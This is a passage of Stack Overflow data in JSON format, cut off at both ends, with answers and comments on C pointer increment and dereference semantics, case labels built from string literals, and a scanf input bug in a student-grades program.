1551904111, "post_id": 55031546, "comment_id": 96815896, "body": "It was a question asked in class not an exam question. I am sitting around after class with no way of testing it and googling on my phone isn&#39;t revealing anything. I was curious."}, {"owner": {"reputation": 1439, "user_id": 5196093, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ovj7.png?s=128&g=1", "display_name": "Ray", "link": "https://stackoverflow.com/users/5196093/ray"}, "edited": false, "score": 0, "creation_date": 1551904706, "post_id": 55031546, "comment_id": 96816147, "body": "You may find <a href=\"http://www.isthe.com/chongo/tech/comp/c/c-precedence.html\" rel=\"nofollow noreferrer\">this reference</a> useful. It explains the precedence of each operator, so you can figure out which operators bind to each value and in what order. (basically order-of-operations, although not exactly the same.) You may also want to look up &quot;post-increment&quot; and &quot;pre-increment&quot;. That&#39;ll explain the difference between <code>p++</code> and <code>++p</code>, which is the most significant case in which precedence and order-of-operations don&#39;t mean the same thing."}], "answers": [{"comments": [{"owner": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "edited": false, "score": 0, "creation_date": 1551903982, "post_id": 55031593, "comment_id": 96815839, "body": "<code>*source++</code> will increment the pointer <i>after</i> dereferencing it. Your answer makes it sound like it will dereference the incremented pointer."}, {"owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "reply_to_user": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "edited": false, "score": 0, "creation_date": 1551904076, "post_id": 55031593, "comment_id": 96815880, "body": "@interjay <code>++</code> has higer precedence over <code>*</code>."}, {"owner": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "edited": false, "score": 1, "creation_date": 1551904124, "post_id": 55031593, "comment_id": 96815906, "body": "@haccks This is post-increment which gives the original value of the pointer. This is what is dereferenced. The pointer is then incremented."}, {"owner": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "edited": false, "score": 2, "creation_date": 1551904295, "post_id": 55031593, "comment_id": 96815978, "body": "Operator precedence doesn&#39;t determine order of operations, it only determines how the expression is parsed. This is basic C and I&#39;m surprised so many people are getting this wrong. <a href=\"https://ideone.com/wwBtkV\" rel=\"nofollow noreferrer\">Here</a> is a demonstration that clearly shows that the original value of the pointer is dereferenced."}, {"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 2, "creation_date": 1551904304, "post_id": 55031593, "comment_id": 96815982, "body": "<a href=\"https://ideone.com/GnVhof\" rel=\"nofollow noreferrer\"><code>char *source = &quot;foo&quot;; printf(&quot;%c\\n&quot;, *source++) &#47;* f, not o *&#47;;</code></a>"}, {"owner": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "edited": false, "score": 0, "creation_date": 1551904751, "post_id": 55031593, "comment_id": 96816166, "body": "Also consider the classic implementation of <code>strcpy</code>: <code>while(*dest++ = *src++);</code>. This wouldn&#39;t work if this answer was correct."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 1, "creation_date": 1551904895, "post_id": 55031593, "comment_id": 96816231, "body": "It is largely academic - the take home here is not to write code like that but rather write code that clearly expresses what you intend without needing to understand the subtle semantics.  I&#39;d not write either expression, but rather <code>p = *source; source++;</code> or <code>source++; p = *source ;</code> which removes all ambiguity.  I dislike classes that try to teach the semantics of this kind when they&#39;d do better to simply emphasise clear and unambiguous code - it is of course unambiguous to the compiler but you&#39;ll get a lot more bug-free code written in life if you simply avoid this nonsense."}, {"owner": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "reply_to_user": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1551905069, "post_id": 55031593, "comment_id": 96816305, "body": "@Clifford Code like this is actually commonly seen, so this is not just academic and it&#39;s important to be able to read it (even if you don&#39;t use it yourself). The K&amp;R book, for example, uses it in implementations of functions like <code>strcpy</code> as I showed above."}], "tags": [], "owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "is_accepted": false, "score": 0, "last_activity_date": 1551907507, "last_edit_date": 1551907507, "creation_date": 1551903816, "answer_id": 55031593, "question_id": 55031546, "link": "https://stackoverflow.com/questions/55031546/differences-in-c-source-source-source/55031593#55031593", "title": "differences in C: *source++, (*source)++, *(source)++", "body": "<p><strike><code>*source++</code> will be parsed as <code>*(source++)</code> because of higher <a href=\"https://en.cppreference.com/w/c/language/operator_precedence\" rel=\"nofollow noreferrer\">precedence</a> of <code>++</code> over <code>*</code> operator. It will increment the pointer by 1 and then will dereference the pointer. \n </strike></p>\n\n<hr>\n\n<p>To understand the behaviour first let me explain how post increment operator works. When you do  </p>\n\n<pre><code>int i = 0;\nint j = i++;\n</code></pre>\n\n<p>then it means that the value of the expression <code>i++</code> will be the value of the operand <code>i</code>. In this case it will be <code>0</code>. The value of the <code>i</code> will be incremented as a side-effect. See the quote from the draft   </p>\n\n<p>n1570 - \u00a76.5.2.4/2:</p>\n\n<blockquote>\n  <p><strong>The result of the postfix ++ operator is the value of the operand</strong>. As a side effect, the value of the operand object is incremented (that is, the value 1 of the appropriate type is added to it). See the discussions of additive operators and compound assignment for information on constraints, types, and conversions and the effects of operations on pointers. <strong>The value computation of the result is sequenced before the side effect of updating the stored value of the operand</strong>.  </p>\n</blockquote>\n\n<p>In case of <code>*source++</code>, compiler will parse it as <code>*(source++)</code>. The result of the expression <code>source++</code> is the value of <code>source</code>. So the current pointer (the address <code>source</code> is pointing to before the side-effect) will be dereferenced and then the side-effect on <code>source</code> will be performed.</p>\n\n<p><code>(*source)++</code> will first dereference the pointer and then increment the dereferenced value by 1.</p>\n\n<p><code>*(source)++</code> is equivalent to the first case.</p>\n\n<hr>\n\n<p><sub> I apologies for the wrong answer and leaving the wrong answer with strikes so that future readers will take a lesson if any one come to the same wrong conclusion as I did. Thanks @interjay and @pmg for correcting me out. I am really glad that you guys are part of this community and contributing to this community with your sharp eyes and mind.</sub></p>\n"}, {"tags": [], "owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "is_accepted": false, "score": 1, "last_activity_date": 1551904835, "creation_date": 1551904835, "answer_id": 55031807, "question_id": 55031546, "link": "https://stackoverflow.com/questions/55031546/differences-in-c-source-source-source/55031807#55031807", "title": "differences in C: *source++, (*source)++, *(source)++", "body": "<p>tiny test program.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n    char z[] = \"World\";\n    char n[] = \"Something\";\n    char *x = \"Hello!!\";\n\n\n    while(*x) printf(\"%c\", *x++);\n    printf(\"\\n\");\n    x = z;\n    while(*x) printf(\"%c\", (*x)++);\n    printf(\"\\n\");\n    x = n;\n    while(*x) printf(\"%c\", *(x)++);\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>\n\n<p>so the <code>*x++</code> dereference the pointer, then increments the pointer\n<code>(*x)++</code> - only increments the referenced object.\n<code>*(x)++</code> == <code>*x++</code></p>\n\n<p>IMO instead of asking try yourself. You will learn something <a href=\"https://ideone.com/bliza0\" rel=\"nofollow noreferrer\">https://ideone.com/bliza0</a></p>\n"}, {"tags": [], "owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "is_accepted": false, "score": 1, "last_activity_date": 1551907181, "creation_date": 1551907181, "answer_id": 55032315, "question_id": 55031546, "link": "https://stackoverflow.com/questions/55031546/differences-in-c-source-source-source/55032315#55032315", "title": "differences in C: *source++, (*source)++, *(source)++", "body": "<p>1 and 3 are the same.</p>\n\n<p>Remember that both postfix and unary forms of <code>++</code> and <code>--</code> have a <em>result</em> and a <em>side effect</em>:</p>\n\n<ul>\n<li><p>The result of <code>x++</code> is the current value of <code>x</code> - as a side effect, <code>x</code> is incremented by 1 (if <code>x</code> is a pointer, it is incremented to point to the next object in a sequence);</p></li>\n<li><p>The result of <code>++x</code> is the current value of <code>x</code> <em>plus 1</em> - as a side effect, <code>x</code> is incremented by 1 (if <code>x</code> is a pointer, the result is the address of the next object in a sequence, and <code>x</code> is updated to point to the next object in a sequence);</p></li>\n</ul>\n\n<p>Both forms of <code>--</code> work the same way, except the value is decremented by 1 - if it's a pointer, then it's set to point to the previous object in a sequence.  </p>\n\n<p>When you throw pointer dereferences into the mix, you get the following:</p>\n\n<ul>\n<li><p>The expression <code>*p++</code> is parsed as <code>*(p++)</code> (so is <code>*(p)++</code>).  The result of <code>*p++</code> is the current value of <code>*p</code> (the value of the thing <code>p</code> is currently pointing to). As a side effect, <code>p</code> is incremented to point to the next object of the same type in a sequence (IOW, the next element of an array);</p></li>\n<li><p>The expression <code>(*p)++</code> is parsed as written.  The result of <code>(*p)++</code> is the current value of <code>*p</code>. As a side effect, <code>*p</code> is incremented by 1.  That is, the value of the thing being pointed to is updated, not the pointer.  </p></li>\n<li><p>The expression <code>++*p</code> is parsed as <code>++(*p)</code>.  The result of <code>++*p</code> is the current value of <code>*p</code> plus 1.  As a side effect, <code>*p</code> is incremented by 1.  </p></li>\n<li><p>The expression <code>*++p</code> is parsed as <code>*(++p)</code>.  The result of <code>*++p</code> is the value of the object <em>following</em> the object <code>p</code> currently points to.  As a side effect, <code>p</code> is incremented to point to the next object.</p></li>\n</ul>\n\n<p>Assume the following declarations:</p>\n\n<pre><code>int a[] = {1, 2, 3, 4};\nint *p = a;   \n</code></pre>\n\n<p>After these lines, the value of <code>p</code> is <code>&amp;a[0]</code>.  So, given the expression</p>\n\n<pre><code>x = *p++;\n</code></pre>\n\n<p>the <em>result</em> of <code>*p++</code> is <code>1</code> (the value of the thing <code>p</code> currently points to), which gets assigned to <code>x</code>.  The <em>side effect</em> is that <code>p</code> is updated to point to <code>a[1]</code>.  </p>\n\n<p>Then we execute</p>\n\n<pre><code>x = (*p)++;  \n</code></pre>\n\n<p>The <em>result</em> of <code>(*p)++</code> is the value of the thing <code>p</code> currently points to (if <code>p</code> points to <code>a[1]</code>, then the value is <code>2</code>), which gets assigned to <code>x</code>.  As a side effect, the thing <code>p</code> points to is incremented (if <code>p</code> points to <code>a[1]</code>, then the value of <code>a[1]</code> is now <code>3</code>).  </p>\n\n<p>The we execute</p>\n\n<pre><code>x = ++*p;    \n</code></pre>\n\n<p>The result of <code>++*p</code> is the value of the thing <code>p</code> points to plus 1, and as a result the thing <code>p</code> points to is incremented (if <code>p</code> points to <code>a[1]</code>, then the value of <code>a[1] + 1</code> is <code>4</code>, which is assigned to <code>x</code>, and the value of <code>a[1]</code> is now <code>4</code>).</p>\n\n<p>Finally, we execute</p>\n\n<pre><code>x = *++p;\n</code></pre>\n\n<p>The result of <code>*++p</code> is the value of the object <em>following</em> the object that <code>p</code> currently points to, and <code>p</code> is incremented to point to that object (if <code>p</code> points to <code>a[1]</code>, then the value of <code>a[2]</code> (<code>3</code>) is written to <code>x</code>, and <code>p</code> is updated to point to <code>a[2]</code>).</p>\n\n<p>Again, <code>--</code> works the same way, just in the other direction.  </p>\n"}], "owner": {"reputation": 29, "user_id": 9500206, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Enrique", "link": "https://stackoverflow.com/users/9500206/enrique"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 377, "favorite_count": 0, "answer_count": 3, "score": -6, "last_activity_date": 1551907507, "creation_date": 1551903601, "last_edit_date": 1551904043, "question_id": 55031546, "link": "https://stackoverflow.com/questions/55031546/differences-in-c-source-source-source", "title": "differences in C: *source++, (*source)++, *(source)++", "body": "<p>IS there a difference between these pointers? What exactly is happening here for each call.</p>\n\n<ol>\n<li>*p++ </li>\n<li>(*p)++, </li>\n<li>*(p)++</li>\n</ol>\n"}, {"tags": ["c", "gcc"], "comments": [{"owner": {"reputation": 95, "user_id": 4110204, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5b38f1e653e66a96263242abc4f5bc4e?s=128&d=identicon&r=PG&f=1", "display_name": "Remy", "link": "https://stackoverflow.com/users/4110204/remy"}, "edited": false, "score": 0, "creation_date": 1551904619, "post_id": 55031246, "comment_id": 96816118, "body": "I am using the C11 standard."}], "answers": [{"tags": [], "owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "is_accepted": false, "score": 1, "last_activity_date": 1551903436, "last_edit_date": 1551903436, "creation_date": 1551902400, "answer_id": 55031280, "question_id": 55031246, "link": "https://stackoverflow.com/questions/55031246/error-case-label-does-not-reduce-to-an-integer-constant-for-characters-selected/55031280#55031280", "title": "error: case label does not reduce to an integer constant for characters selected from a string literal", "body": "<p>In that example, in theory yes it could.</p>\n\n<p>However, obviously it does not. So you have to write your code differently anyway.</p>\n\n<p>To expand on Florian's answer:</p>\n\n<p>In C++ using a literal or <code>constexpr</code> this does apparently work.</p>\n\n<p>An example which compiles with <code>g++ -std=c++17 -pedantic -O3 -DNDEBUG -flto -march=native -Wall -Wextra -Werror cpp-switch-test.cpp -o cpp-switch-test</code></p>\n\n<pre><code>int main(int, char *argv[]) {\n    constexpr char s[] = \"string\";\n    switch (argv[1][0]) {\n        case *s:\n            break;\n        case s[4]:\n            break;\n        case \"test\"[0]:\n        default:\n            return 1;\n    }\n    return 0;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 0, "creation_date": 1551903454, "post_id": 55031362, "comment_id": 96815604, "body": "6.6p10 allows additional forms of constant expressions, but I don&#39;t see any flex in the rules for <i>integer</i> constant expressions?"}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "reply_to_user": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 0, "creation_date": 1551995064, "post_id": 55031362, "comment_id": 96856255, "body": "@zwol: If the Committee intended that 6.6p10 only apply to non-integer constant expressions, why do you suppose that they didn&#39;t say that?  If e.g. code declares an automatic object <code>char foo[(int)(15.0&#47;3.0)];</code>, is anything useful gained by requiring that a compiler keep track of the fact that even though <code>foo</code> will always be a 5-character array, and it can be allocated like one, <code>sizeof foo</code> isn&#39;t an integer constant expression, and code must not be allowed to jump branch past its declaration?"}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "reply_to_user": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1552075618, "post_id": 55031362, "comment_id": 96888129, "body": "@supercat Since both &quot;constant expression&quot; and &quot;integer constant expression&quot; are defined terms in the C standard, the sentence &quot;An implementation may accept other forms of constant expressions&quot; does not license the implementation to accept other forms of integer constant expressions. I cannot speculate on the committee&#39;s motives for not allowing other forms of ICEs, but I would point out that VLAs were shoehorned into C99 somewhat clumsily and this wouldn&#39;t be the only place where they interact poorly with apparently-unrelated requirements."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "reply_to_user": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 0, "creation_date": 1552078057, "post_id": 55031362, "comment_id": 96889127, "body": "@zwol: I would interpret the Standard as saying that the set of constructs implementations are required to accept in contexts requiring integer constant expressions is smaller than the set that would be required in other contexts.  Among other things, a compiler which can&#39;t afford to have a floating-point library in memory while it compiles could process <code>static float foo=20.0&#47;5.0;</code> by generating code that would perform the division prior to the execution of <code>main</code>.  Given <code>struct foo{int bar[20.0&#47;5.0],boz;};</code>, however, such deferred evaluation would require run-time patching lots of code."}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "reply_to_user": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1552101660, "post_id": 55031362, "comment_id": 96894808, "body": "@supercat That&#39;s all perfectly true but doesn&#39;t appear to have anything to do with the question of whether &quot;An implementation may accept other forms of constant expressions&quot; implies &quot;An implementation may accept other forms of integer constant expressions&quot;.  My interpretation is that it doesn&#39;t, simply because &quot;integer constant expression&quot; and &quot;constant expression&quot; are independent terms in the standard."}], "tags": [], "owner": {"reputation": 26934, "user_id": 8316315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44d833a8a46fea39d7bfca1540ea9c07?s=128&d=identicon&r=PG&f=1", "display_name": "Florian Weimer", "link": "https://stackoverflow.com/users/8316315/florian-weimer"}, "is_accepted": false, "score": 0, "last_activity_date": 1551902819, "creation_date": 1551902819, "answer_id": 55031362, "question_id": 55031246, "link": "https://stackoverflow.com/questions/55031246/error-case-label-does-not-reduce-to-an-integer-constant-for-characters-selected/55031362#55031362", "title": "error: case label does not reduce to an integer constant for characters selected from a string literal", "body": "<p>A C compiler may treat additional expressions as integer constant expressions, so the compiler could treat this as a constant as well.</p>\n\n<p>You could use a current C++ compiler instead: C++11 and later treat such expressions as constant.</p>\n"}, {"comments": [{"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "reply_to_user": {"reputation": 95, "user_id": 4110204, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5b38f1e653e66a96263242abc4f5bc4e?s=128&d=identicon&r=PG&f=1", "display_name": "Remy", "link": "https://stackoverflow.com/users/4110204/remy"}, "edited": false, "score": 0, "creation_date": 1551908457, "post_id": 55031504, "comment_id": 96817732, "body": "@Remy Yes, this hasn&#39;t changed since C89. There is a version of the original ANSI C standard available from the Wayback Machine: &lt;<a href=\"https://web.archive.org/web/20151125170555/http://flash-gordon.me.uk/ansi.c.txt\" rel=\"nofollow noreferrer\">web.archive.org/web/20151125170555/http://flash-gordon.me.u&zwnj;&#8203;k/&hellip;</a>&gt;. It appears to have essentially the same requirement on case labels in section &quot;3.6.4.2 The switch statement&quot;, and essentially the same definition of the restricted subset of constant expressions in section &quot;3.4 CONSTANT EXPRESSIONS&quot; (note they&#39;re called <i>integral</i> constant expressions in this edition). But, unlike N1570, it&#39;s a txt file so I can&#39;t link to specific sections."}], "tags": [], "owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "is_accepted": true, "score": 5, "last_activity_date": 1551903399, "creation_date": 1551903399, "answer_id": 55031504, "question_id": 55031246, "link": "https://stackoverflow.com/questions/55031246/error-case-label-does-not-reduce-to-an-integer-constant-for-characters-selected/55031504#55031504", "title": "error: case label does not reduce to an integer constant for characters selected from a string literal", "body": "<p><a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.8.4.2p3\" rel=\"noreferrer\">C2011 6.4.8.2p3</a> requires each case label's expression to be an <em>integer constant expression</em>.  Integer constant expressions are a restricted subset of constant expressions, defined in \u00a7<a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.6p6\" rel=\"noreferrer\">6.6p6</a>.  String literals may not appear in integer constant expressions.</p>\n\n<p>6.4.8.2p3 is a \"constraints\" paragraph, so this program is ill-formed.</p>\n\n<p>So the answer to your question, as literally asked, is: the compiler <em>could</em> reduce <code>\"string\"[0]</code> to <code>'s'</code>, but it's not allowed to; it is required to reject your program instead.</p>\n"}], "owner": {"reputation": 95, "user_id": 4110204, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5b38f1e653e66a96263242abc4f5bc4e?s=128&d=identicon&r=PG&f=1", "display_name": "Remy", "link": "https://stackoverflow.com/users/4110204/remy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 175, "favorite_count": 0, "accepted_answer_id": 55031504, "answer_count": 3, "score": 1, "last_activity_date": 1551903436, "creation_date": 1551902220, "question_id": 55031246, "link": "https://stackoverflow.com/questions/55031246/error-case-label-does-not-reduce-to-an-integer-constant-for-characters-selected", "title": "error: case label does not reduce to an integer constant for characters selected from a string literal", "body": "<p>I get this error with this code compiling with gcc 8.2:</p>\n\n<pre><code>#define literal \"string\"\nswitch(i) {\ncase literal[0]:\nbreak;\n}\n</code></pre>\n\n<p>Could the compiler reduce the expression literal[0] to 's' in my example?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 2, "creation_date": 1551901631, "post_id": 55031059, "comment_id": 96814652, "body": "If you checked the return codes <i>properly</i> from your calls, you&#39;d have a better idea where the problem lies."}, {"owner": {"reputation": 37, "user_id": 11091643, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s7F5o_n7qn4/AAAAAAAAAAI/AAAAAAAAArQ/gDpkNU9MCwg/photo.jpg?sz=128", "display_name": "Ayoub Souid", "link": "https://stackoverflow.com/users/11091643/ayoub-souid"}, "reply_to_user": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 0, "creation_date": 1551901799, "post_id": 55031059, "comment_id": 96814735, "body": "it is in the &quot;ModifierEtudiant&quot; method"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 1, "creation_date": 1551901888, "post_id": 55031059, "comment_id": 96814775, "body": "The function <code>scanf()</code> returns a helpful value. Do you know that value in the problematic case? You ignore it at your own risk."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1551901961, "post_id": 55031059, "comment_id": 96814809, "body": "Did you try to output the read value of NouveauMoyen? Make sure that it is initialised with a special value that you will be able to tell apart from any possibly entered value."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1551902054, "post_id": 55031059, "comment_id": 96814864, "body": "Probably not related to your core problem, but in all your calls, the <i>ficiher</i> and the <i>&#233;tudiant</i> should be local variables, not arguments."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 1, "creation_date": 1551902066, "post_id": 55031059, "comment_id": 96814871, "body": "If I am to guess, your scanf for an int in main() leaves a newline in the input stream, which terminates the attempt to enter a students name early and empty."}, {"owner": {"reputation": 37, "user_id": 11091643, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s7F5o_n7qn4/AAAAAAAAAAI/AAAAAAAAArQ/gDpkNU9MCwg/photo.jpg?sz=128", "display_name": "Ayoub Souid", "link": "https://stackoverflow.com/users/11091643/ayoub-souid"}, "edited": false, "score": 0, "creation_date": 1551902106, "post_id": 55031059, "comment_id": 96814896, "body": "I&#39;ve tried to print it and it prints correctly"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1551902161, "post_id": 55031059, "comment_id": 96814928, "body": "<a href=\"http://sekrit.de/webdocs/c/beginners-guide-away-from-scanf.html\" rel=\"nofollow noreferrer\">sekrit.de/webdocs/c/beginners-guide-away-from-scanf.html</a>  <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">ericlippert.com/2014/03/05/how-to-debug-small-programs</a>"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1551902296, "post_id": 55031059, "comment_id": 96815017, "body": "You are not restricting input lengths: this <code>scanf(&quot;%s&quot;,&amp;RechercheEtudiant);</code> begs to fall over. It should be <code>scanf(&quot;%9s&quot;, RechercheEtudiant);</code> along with some error checking."}, {"owner": {"reputation": 37, "user_id": 11091643, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s7F5o_n7qn4/AAAAAAAAAAI/AAAAAAAAArQ/gDpkNU9MCwg/photo.jpg?sz=128", "display_name": "Ayoub Souid", "link": "https://stackoverflow.com/users/11091643/ayoub-souid"}, "edited": false, "score": 0, "creation_date": 1551902680, "post_id": 55031059, "comment_id": 96815226, "body": "i&#39;ve fixed the the input length but still not getting the new mark value"}, {"owner": {"reputation": 26941, "user_id": 2979617, 